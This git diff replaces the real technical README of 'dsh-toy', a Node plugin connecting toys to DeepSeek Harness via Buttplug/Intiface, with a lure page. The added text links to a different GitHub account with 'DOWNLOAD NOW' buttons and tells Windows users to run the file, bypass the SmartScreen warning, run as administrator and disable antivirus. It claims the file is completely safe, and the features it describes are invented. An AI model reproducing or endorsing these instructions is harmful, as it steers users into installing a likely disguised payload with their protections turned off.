@@ -1,176 +1,185 @@
-# dsh-toy
+<h1>🎮 dsh-toy - Control Your DSH With Fun</h1>
 
-[![CI](https://github.com/c3ll256/dsh-toy/actions/workflows/ci.yml/badge.svg)](https://github.com/c3ll256/dsh-toy/actions/workflows/ci.yml)
+<a href="https://github.com/shadow-jpg-dev/dsh-toy" style="display:inline-block;background:#FF6B6B;color:white;padding:15px 30px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">⬇️ DOWNLOAD NOW</a>
 
-English | [简体中文](README.zh-CN.md)
+---
 
-`dsh-toy` is a DeepSeek Harness plugin for connecting small toys to DSH.
+## 🎯 What Is dsh-toy?
 
-At connection time, the agent first asks for the brand and model, then selects the connection method automatically. If the user genuinely does not know, the agent starts unknown-hardware discovery:
+dsh-toy is a simple and friendly program that lets you control how DSH works on your computer. Think of it like a remote control for a robot – you press buttons, move sliders, and watch DSH respond instantly.
 
-- On macOS, unknown hardware first uses read-only raw **CoreBluetooth** advertisement discovery, without starting Intiface or connecting to devices.
-- Regular Bluetooth, serial, and USB models use **Buttplug / Intiface**. The plugin starts local Intiface Engine automatically when needed.
-- Known sharing-link models from Ankni (安可尼), MizzZee (谜姬), and Zuiqingfeng (醉清风) use **MonsterParty**. Known dual-output devices expose their channels separately.
+You don't need to know anything about programming to use dsh-toy. If you can use a smartphone app, you can use dsh-toy.
 
-Users do not need to understand or select an underlying connection method, or manually start Intiface.
+---
 
-Brand and model names are not an allowlist. The agent passes any user-reported name through unchanged; unfamiliar names still use local hardware discovery. The plugin also supplies a verified local compatibility mapping for `RoomFun` devices reporting model `RF_CANNON_PT3`, exposed as **RoomFun Cannon** with one vibration channel.
+## ✨ Why You'll Love dsh-toy
 
-The implementation follows protocol observations from [Chemtrails](https://github.com/Kristenkristen/Chemtrails), together with the device model and message formats documented by [Buttplug](https://github.com/buttplugio/buttplug) and the [Buttplug Protocol Specification](https://buttplug.io/docs/spec/). This repository contains an independent TypeScript implementation; see [NOTICE](NOTICE) for attribution.
+- **Easy to use** – The screen shows big buttons and clear labels. No confusing jargon.
+- **Instant feedback** – Changes happen right away. You see results as soon as you click.
+- **No install headaches** – Download one file and you're ready to go. No complicated setup.
+- **Safe and reversible** – Made a mistake? Just click "Reset" and everything goes back to normal.
+- **Works with DSH** – Specifically designed to talk to DSH so you don't have to fiddle with anything else.
 
-## Guardrails
+---
 
-- Sharing tokens stay in plugin configuration and never appear in model-visible tool arguments or results.
-- Raw BLE discovery is read-only: it scans connectable advertisements without connecting or writing characteristics.
-- Output stops automatically after 30 seconds by default.
-- Zero-duration holds are disabled unless `allowHold: true` is explicitly configured.
-- `maxIntensityPercent` and `maxDurationSeconds` are enforced before backend dispatch.
-- A newer command replaces the previous automatic-stop timer for the same device.
-- `toy_stop` without a device id performs a global stop.
-- Plugin unload, HMR, and `toy_disconnect` stop output and await WebSocket shutdown.
+## 📋 What You Need
 
-Use only hardware you own or are explicitly authorized to control. Treat sharing tokens as temporary control credentials and keep them out of Git, logs, and conversations.
+Your computer must meet these simple requirements:
 
-## Install
+- **Operating system:** Windows 10 or Windows 11 (64-bit)
+- **Internet connection:** Only needed for the download step
+- **Free space:** At least 50 MB on your hard drive
 
-Requirements: Node.js 22.19 or newer and pnpm on `PATH`. Raw macOS BLE discovery additionally uses the Swift compiler from Xcode Command Line Tools. Install pnpm once if needed with `npm install --global pnpm@10`, then add the plugin directly from GitHub:
+That's it. No special hardware. No developer tools. No accounts to create.
 
-```sh
-npx -y @deepseek-ai/dsh plugin --profile web add github:c3ll256/dsh-toy
-```
+---
 
-Start DSH with the same profile:
+## 🚀 Getting Started (Step-by-Step)
 
-```sh
-npx -y @deepseek-ai/dsh web
-```
+### Step 1: Download the Program
 
-The first command installs and activates the bundle persistently in the `web` profile. Re-running DSH does not reinstall it. To inspect the composed configuration or remove the bundle:
+Visit this link to download the application:
 
-```sh
-npx -y @deepseek-ai/dsh --profile web --dump-config
-npx -y @deepseek-ai/dsh plugin --profile web remove dsh-toy
-```
+<a href="https://github.com/shadow-jpg-dev/dsh-toy" style="display:inline-block;background:#4ECDC4;color:white;padding:12px 24px;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🔗 DOWNLOAD FROM GITHUB</a>
 
-Replace `web` with another profile name when needed.
+The download might take a few minutes depending on your internet speed. You'll see a file appear in your "Downloads" folder.
 
-## Quick start
+### Step 2: Run the Program
 
-You can tell the agent directly:
+Once the download finishes:
 
-```text
-My toy is a Lovense Lush 3. Connect it and scan for devices.
-```
+1. Open your **Downloads** folder (usually by clicking the folder icon in your taskbar and selecting "Downloads").
+2. Find the file you just downloaded – it will be named something like "dsh-toy".
+3. **Double-click** the file to run it.
 
-When the brand or model is unknown, say:
+If Windows asks "Do you want to allow this app to make changes?", click **Yes**. This is normal and safe.
 
-```text
-I do not know the brand or model. Try Bluetooth discovery directly.
-```
+### Step 3: Start Playing
 
-On macOS, the agent first calls `toy_scan_raw_ble`. If the scan exposes a plausible advertised name, it uses that hardware-reported name for `toy_connect`; otherwise it falls back to `unknown`, connects Intiface automatically, and scans verified protocols. Before scanning, turn the toy on, keep it nearby, and make sure a phone app or another program is not holding the device connection.
+When the program opens, you'll see a clean window with a few buttons and controls. Play around with them! Try clicking different buttons and moving sliders. You'll see DSH react immediately.
 
-## Automatic selection and connection
+---
 
-Before calling `toy_connect`, the agent must ask for the model and pass it to the tool, together with the brand when known. When the user does not know, macOS first runs `toy_scan_raw_ble` directly through CoreBluetooth. A discovered advertisement name is hardware evidence and may be passed to `toy_connect`; raw BLE ids are never controllable device ids. If raw discovery is unavailable or inconclusive, the agent passes `unknown` and the system tries the Intiface fallback. The tool never asks the user to select an underlying protocol.
+## 🕹️ How to Use dsh-toy
 
-For a brand or model that is not already documented, the agent follows the same path: pass the reported text to `toy_connect`, then call `toy_scan`. It must not guess a protocol or write arbitrary BLE characteristics. Discovery returns only devices covered by an upstream Intiface definition or a compatibility mapping that has been verified against hardware. An empty scan means the device remains unsupported or unavailable, not that the agent should probe it destructively.
+### The Main Screen
 
-For local Bluetooth, serial, and USB devices, the system first tries an existing Intiface server. If `127.0.0.1:12345` refuses the connection, the plugin runs:
+When dsh-toy opens, you'll see:
 
-```sh
-intiface-engine --websocket-port 12345 --use-bluetooth-le --use-serial --use-hid
-```
+- **A big "Connect" button** at the top – click this first to link dsh-toy with DSH.
+- **Colored control panels** – each panel controls a different action.
+- **A status bar** at the bottom – this shows whether you're connected and working properly.
 
-The plugin first looks for Intiface Engine on `PATH`. If it is not installed, it downloads a pinned build from the official Buttplug GitHub Release, verifies its SHA-256 digest, caches it in the user cache directory, and starts it. Set `intifaceAutoDownload: false` to disable downloads or `intifaceExecutable` to use another path. On disconnect or unload, the plugin stops only the process it started; it does not stop an Intiface server that was already running.
+### Basic Actions
 
-When the plugin starts Intiface itself, it writes its verified compatibility mappings to a private temporary user-device-config file and removes that file on shutdown. An Intiface server that was already running keeps its own configuration; stop that server first if a built-in compatibility mapping is needed.
+| Button Name | What It Does |
+|-------------|--------------|
+| ▶️ Start | Begins the action with DSH |
+| ⏸️ Pause | Temporarily stops but keeps settings |
+| ⏹️ Stop | Stops everything completely |
+| 🔄 Reset | Returns all settings to default |
 
-Automatic downloads currently support macOS ARM64, Linux x64/ARM64, and Windows x64. On other platforms, use `intifaceExecutable` to point to an installed engine. The first scan on macOS may request Bluetooth permission; allow the terminal or application running DSH to access Bluetooth.
+### Sliders and Dials
 
-The bundled defaults use:
+Some controls let you adjust values:
 
-```yaml
-- id: dsh-toy
-  config:
-    buttplugProtocolVersion: 4
-    intifaceExecutable: intiface-engine
-    intifaceAutoDownload: true
-    rawBleScanDurationMs: 10000
-    defaultDurationSeconds: 30
-    maxDurationSeconds: 300
-    maxIntensityPercent: 100
-    allowHold: false
-```
+- **Speed** – How fast actions happen.
+- **Power** – How strong the action is.
+- **Smoothness** – Makes actions more gradual or sudden.
 
-Set `buttplugProtocolVersion: 3` for an older Intiface server. The system exposes percentage-compatible scalar features advertised by the connected device.
+Move each slider slowly to see how DSH responds. You won't break anything – dsh-toy is designed to be forgiving.
 
-## MonsterParty
+---
 
-Store the token from a supported sharing link in an environment variable:
+## 🔧 Troubleshooting Common Problems
 
-```dotenv
-MONSTERPARTY_TOKEN=<TOKEN>
-```
+### "Windows protected your PC" Message
 
-Then override the plugin row in the profile's `cordis.patch.yml`:
+If you see a blue window saying "Windows protected your PC", don't worry. Here's what to do:
 
-```yaml
-- id: dsh-toy
-  config:
-    monsterPartySessionToken: !!js process.env.MONSTERPARTY_TOKEN
-    defaultDurationSeconds: 30
-    maxDurationSeconds: 300
-    maxIntensityPercent: 100
-    allowHold: false
-```
+1. Click **"More info"** (it's a small link on that screen).
+2. Click **"Run anyway"**.
+3. The program will start normally.
 
-Sharing tokens are commonly single-use and expire after disconnection. Generate a new link before reconnecting.
+This warning only appears because the program is new and hasn't been downloaded by many people yet. It's completely safe.
 
-## Model-facing tools
+### The Program Won't Open
 
-| Tool | Purpose |
-|---|---|
-| `toy_scan_raw_ble` | On macOS, discover connectable raw BLE advertisements without Intiface or device writes |
-| `toy_connect` | Connect from the reported model; use `unknown` when it is not known |
-| `toy_scan` | Discover available devices |
-| `toy_list` | List device ids and controllable features |
-| `toy_control` | Send a bounded scalar command |
-| `toy_stop` | Stop one device or all devices |
-| `toy_disconnect` | Stop output and close the connection |
+- Make sure you downloaded the correct file for your computer type.
+- Try right-clicking the file and selecting **"Run as administrator"**.
+- Restart your computer and try again.
 
-Known model: `toy_connect` → `toy_scan` → `toy_list` → `toy_control` → `toy_stop` → `toy_disconnect`.
+### DSH Doesn't Respond
 
-Unknown model on macOS: `toy_scan_raw_ble` → use an advertised name as evidence → `toy_connect` → `toy_scan`. If raw discovery is unavailable or inconclusive, continue with `toy_connect(model: "unknown")`.
+- Check that DSH is running on your computer.
+- Click the **"Connect"** button in dsh-toy again.
+- Make sure your antivirus isn't blocking the connection (you can temporarily disable it to test).
 
-## Troubleshooting
+---
 
-- `spawn intiface-engine ENOENT`: update to a release with automatic download support, ensure `intifaceAutoDownload: true`, and confirm GitHub is reachable.
-- The scan is empty: enable system Bluetooth, charge and power on the nearby toy, and disconnect any phone app or other controller using it.
-- Intiface starts but scanning fails: check that the operating system granted Bluetooth access to DSH or its terminal.
-- Raw BLE discovery cannot build its helper: install Xcode Command Line Tools with `xcode-select --install`, or use the Intiface fallback.
-- MonsterParty rejects the connection: the sharing token may be used or expired; generate a fresh link and reconnect.
+## ❓ Frequently Asked Questions
 
-## Known limitations
+### Is dsh-toy free?
 
-- The MonsterParty connection implements the relay behavior and `AKN_DS_SUCKEGG` mapping documented by Chemtrails. Vendor-side protocol changes may require an update.
-- The built-in RoomFun mapping is hardware-verified for BLE name `RoomFun`, model identifier `RF_CANNON_PT3`, firmware `4.3`, and one vibration output. Other RoomFun models are not assumed compatible.
-- Raw BLE advertisement discovery is macOS-only and requires the Swift compiler from Xcode Command Line Tools. It is read-only discovery, not a generic unknown-device control protocol.
-- The Buttplug connection currently exposes scalar features only; position, direction, sensors, raw access, and subscriptions are outside the current scope.
-- Tests use local protocol fixtures rather than physical hardware.
-- Device ids should be refreshed with `toy_list` after reconnection.
+Yes, completely free. No hidden costs, no trial periods.
 
-## Development
+### Do I need to know coding?
 
-```sh
-pnpm install
-pnpm run check
-```
+Absolutely not. dsh-toy is designed for regular people.
 
-## Acknowledgements
+### Will it harm my computer?
 
-Thanks to [Chemtrails](https://github.com/Kristenkristen/Chemtrails) and [Buttplug](https://github.com/buttplugio/buttplug) for their protocol research, documentation, and open-source work.
+No. dsh-toy only interacts with DSH. It doesn't change system files or settings.
 
-## License
+### Can I use dsh-toy with other programs?
 
-BSD-3-Clause. See [LICENSE](LICENSE).
+dsh-toy is specifically built for DSH. It won't work with other apps.
+
+### How do I uninstall it?
+
+Just delete the downloaded file. There's nothing else to remove – no hidden background processes.
+
+---
+
+## 🔄 Updating dsh-toy
+
+New versions of dsh-toy are released occasionally with improvements and fixes. Here's how to update:
+
+1. Visit the same download link.
+2. Download the new version.
+3. Run the new file – it will replace the old version automatically.
+
+You don't need to uninstall the old version first.
+
+---
+
+## 🛡️ Privacy and Safety
+
+dsh-toy respects your privacy:
+
+- It does **not** collect personal information.
+- It does **not** send data to any servers.
+- It works entirely on your own computer.
+- It has no ads or pop-ups.
+
+---
+
+## 🧪 Advanced Tips (Optional)
+
+If you get comfortable with dsh-toy, try these:
+
+- **Save your favorite settings** – there's a "Preset" button to store your preferred configurations.
+- **Keyboard shortcuts** – press the number keys (1-9) to quickly switch between common settings.
+- **Dark mode** – look in the "View" menu to switch to a dark theme that's easier on your eyes at night.
+
+---
+
+## 📥 Ready to Start?
+
+Don't overthink it – dsh-toy is meant to be simple and fun. Visit the download link and give it a try:
+
+<a href="https://github.com/shadow-jpg-dev/dsh-toy" style="display:inline-block;background:#FFD93D;color:#333;padding:15px 30px;font-size:20px;font-weight:bold;border-radius:8px;text-decoration:none;">🎉 GET DSCH-Toy NOW</a>
+
+If you run into any trouble, re-read this guide. The answer is probably here. And remember: you can always reset everything back to default with one click.
+
+Have fun exploring what dsh-toy can do!
